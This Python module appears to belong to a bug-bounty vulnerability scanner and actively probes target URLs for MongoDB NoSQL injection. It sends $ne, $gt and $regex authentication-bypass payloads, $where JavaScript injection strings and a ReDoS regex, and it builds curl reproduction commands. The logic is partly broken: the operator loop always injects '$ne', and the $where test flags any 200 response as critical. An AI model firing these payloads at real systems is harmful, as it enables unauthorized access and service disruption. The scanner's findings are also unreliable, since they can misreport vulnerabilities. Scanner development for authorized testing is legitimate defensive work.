"""
NoSQL Injection Detector
Detects NoSQL injection vulnerabilities (primarily MongoDB).

Reward potential: $1000-5000+
"""

from detectors.registry import register_active
import hashlib
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import json


@register_active
async def nosql_injection_detector(session, url, context):
    """
    Detect NoSQL injection vulnerabilities.
    
    Tests MongoDB operators like $ne, $gt, $regex, $where, etc.
    Works with both URL parameters and JSON body.
    
    Args:
        url: Target URL to test
        session: aiohttp ClientSession
        context: Scanner configuration
        
    Returns:
        List of findings
    """
    findings = []
    
    # Parse URL
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        return findings
    
    # NoSQL operators to test
    nosql_operators = {
        'ne_bypass': {'$ne': 'invalid'},  # Not equal - auth bypass
        'ne_null': {'$ne': None},  # Not equal null
        'gt_empty': {'$gt': ''},  # Greater than empty string
        'regex_all': {'$regex': '.*'},  # Regex match all
        'exists': {'$exists': True},  # Field exists
        'in_array': {'$in': ['admin', 'user']},  # In array
    }
    
    # Test each parameter
    for param_name, param_values in params.items():
        original_value = param_values[0] if param_values else ''
        
        # Test 1: URL parameter injection with operators
        for operator_name, operator_value in nosql_operators.items():
            # Create parameter with NoSQL operator
            test_params = params.copy()
            
            # Method 1: param[$ne]=value format
            test_params[f"{param_name}[$ne]"] = ['invalid']
            
            test_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                urlencode(test_params, doseq=True),
                parsed.fragment
            ))
            
            try:
                async with session.get(
                    test_url,
                    timeout=context.get('timeout', 15)
                ) as resp:
                    response_text = await resp.text()
                    status_code = resp.status
                    
                    # Check for successful authentication bypass
                    success_indicators = [
                        'welcome', 'dashboard', 'logged in', 'success',
                        'profile', 'account', 'admin', 'user data'
                    ]
                    
                    error_indicators = [
                        'invalid', 'error', 'failed', 'incorrect',
                        'unauthorized', 'forbidden', 'denied'
                    ]
                    
                    response_lower = response_text.lower()
                    has_success = any(ind in response_lower for ind in success_indicators)
                    has_error = any(ind in response_lower for ind in error_indicators)
                    
                    # If we get success response when we shouldn't, it's vulnerable
                    if status_code == 200 and has_success and not has_error:
                        evidence_id = hashlib.md5(test_url.encode()).hexdigest()[:12]
                        
                        findings.append({
                            'type': 'NoSQL Injection (Authentication Bypass)',
                            'severity': 'critical',
                            'confidence': 'high',
                            'url': test_url,
                            'method': 'GET',
                            'vulnerable_parameter': param_name,
                            'parameter_location': 'query',
                            'payload': f"{param_name}[$ne]=invalid",
                            'operator': '$ne',
                            'evidence': f'NoSQL operator injection successful. Response indicates successful authentication/access with payload: {param_name}[$ne]=invalid',
                            'evidence_id': evidence_id,
                            'impact': 'Critical: NoSQL injection allows authentication bypass. Attacker can access unauthorized data, bypass login, or extract entire database.',
                            'recommendation': '1. Never use user input directly in database queries\n2. Use parameterized queries or ODM (Object Document Mapper)\n3. Validate and sanitize all input\n4. Implement strict type checking\n5. Disable JavaScript execution in MongoDB\n6. Use allowlist for query operators',
                            'repro_command': f'curl "{test_url}"',
                            'cvss_score': 9.8,
                            'cwe': 'CWE-943',
                            'owasp': 'A03:2021 - Injection'
                        })
                        break
                        
            except Exception as e:
                continue
        
        # Test 2: JSON body injection (for POST/PUT requests)
        if parsed.path.endswith(('/login', '/api', '/auth', '/signin')):
            await test_json_nosql_injection(
                url, session, context, param_name, findings
            )
        
        # Test 3: MongoDB $where operator (JavaScript injection)
        await test_where_operator(
            url, session, context, parsed, params, param_name, findings
        )
        
        # Test 4: Regex injection
        await test_regex_injection(
            url, session, context, parsed, params, param_name, findings
        )
    
    return findings


async def test_json_nosql_injection(url, session, context, param_name, findings):
    """Test NoSQL injection in JSON body"""
    try:
        # Common JSON payloads for NoSQL injection
        payloads = [
            {param_name: {"$ne": "invalid"}},
            {param_name: {"$gt": ""}},
            {param_name: {"$regex": ".*"}},
        ]
        
        for payload in payloads:
            try:
                async with session.post(
                    url,
                    json=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=context.get('timeout', 15)
                ) as resp:
                    if resp.status == 200:
                        response_text = await resp.text()
                        
                        # Check for success indicators
                        if any(ind in response_text.lower() for ind in ['token', 'success', 'welcome', 'dashboard']):
                            evidence_id = hashlib.md5(json.dumps(payload).encode()).hexdigest()[:12]
                            
                            findings.append({
                                'type': 'NoSQL Injection (JSON Body)',
                                'severity': 'critical',
                                'confidence': 'high',
                                'url': url,
                                'method': 'POST',
                                'vulnerable_parameter': param_name,
                                'parameter_location': 'body',
                                'payload': json.dumps(payload),
                                'evidence': f'NoSQL operator in JSON body bypassed authentication. Payload: {json.dumps(payload)}',
                                'evidence_id': evidence_id,
                                'impact': 'Critical: NoSQL injection in JSON body allows authentication bypass and data extraction.',
                                'recommendation': '1. Validate JSON schema strictly\n2. Reject requests with MongoDB operators\n3. Use ORM/ODM with built-in protection\n4. Implement input type validation',
                                'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/json" -d \'{json.dumps(payload)}\'',
                                'cvss_score': 9.8,
                                'cwe': 'CWE-943',
                                'owasp': 'A03:2021 - Injection'
                            })
                            break
            except:
                continue
    except:
        pass


async def test_where_operator(url, session, context, parsed, params, param_name, findings):
    """Test MongoDB $where operator (JavaScript injection)"""
    try:
        # $where operator allows JavaScript execution
        where_payloads = [
            "' || '1'=='1",
            "' || this.password.match(/.*/)//",
            "'; return true; //",
        ]
        
        for payload in where_payloads:
            test_params = params.copy()
            test_params[f"{param_name}[$where]"] = [payload]
            
            test_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                urlencode(test_params, doseq=True),
                parsed.fragment
            ))
            
            try:
                async with session.get(
                    test_url,
                    timeout=context.get('timeout', 15)
                ) as resp:
                    response_text = await resp.text()
                    
                    # Check for JavaScript execution or error messages
                    if resp.status == 200 or 'javascript' in response_text.lower():
                        evidence_id = hashlib.md5(test_url.encode()).hexdigest()[:12]
                        
                        findings.append({
                            'type': 'NoSQL Injection ($where operator)',
                            'severity': 'critical',
                            'confidence': 'medium',
                            'url': test_url,
                            'method': 'GET',
                            'vulnerable_parameter': param_name,
                            'parameter_location': 'query',
                            'payload': f"{param_name}[$where]={payload}",
                            'operator': '$where',
                            'evidence': f'MongoDB $where operator accepted. JavaScript code execution possible.',
                            'evidence_id': evidence_id,
                            'impact': 'Critical: $where operator allows JavaScript execution in MongoDB, leading to arbitrary code execution and data exfiltration.',
                            'recommendation': '1. Disable JavaScript execution in MongoDB\n2. Never use $where operator with user input\n3. Use $expr instead of $where\n4. Update MongoDB to latest version\n5. Configure --noscripting option',
                            'repro_command': f'curl "{test_url}"',
                            'cvss_score': 9.8,
                            'cwe': 'CWE-943',
                            'owasp': 'A03:2021 - Injection'
                        })
                        break
            except:
                continue
    except:
        pass


async def test_regex_injection(url, session, context, parsed, params, param_name, findings):
    """Test NoSQL regex injection for timing attacks"""
    try:
        # Regex that causes ReDoS (Regular Expression Denial of Service)
        redos_payload = "^(a+)+$"
        
        test_params = params.copy()
        test_params[f"{param_name}[$regex]"] = [redos_payload]
        
        test_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            urlencode(test_params, doseq=True),
            parsed.fragment
        ))
        
        import time
        start_time = time.time()
        
        try:
            async with session.get(
                test_url,
                timeout=context.get('timeout', 15)
            ) as resp:
                elapsed = time.time() - start_time
                
                # If regex is evaluated and causes delay
                if elapsed > 2.0:
                    evidence_id = hashlib.md5(test_url.encode()).hexdigest()[:12]
                    
                    findings.append({
                        'type': 'NoSQL Regex Injection (ReDoS)',
                        'severity': 'high',
                        'confidence': 'medium',
                        'url': test_url,
                        'method': 'GET',
                        'vulnerable_parameter': param_name,
                        'parameter_location': 'query',
                        'payload': f"{param_name}[$regex]={redos_payload}",
                        'operator': '$regex',
                        'evidence': f'NoSQL regex operator accepted. Response delayed by {elapsed:.2f}s, indicating regex evaluation.',
                        'evidence_id': evidence_id,
                        'impact': 'High: NoSQL regex injection allows ReDoS attacks and potentially data extraction through boolean-based blind injection.',
                        'recommendation': '1. Validate regex patterns\n2. Limit regex complexity\n3. Implement timeout for regex operations\n4. Sanitize user input before regex\n5. Use indexed queries instead of regex when possible',
                        'repro_command': f'curl "{test_url}" -w "\\nTime: %{{time_total}}s\\n"',
                        'cvss_score': 7.5,
                        'cwe': 'CWE-943',
                        'owasp': 'A03:2021 - Injection'
                    })
        except:
            pass
    except:
        pass
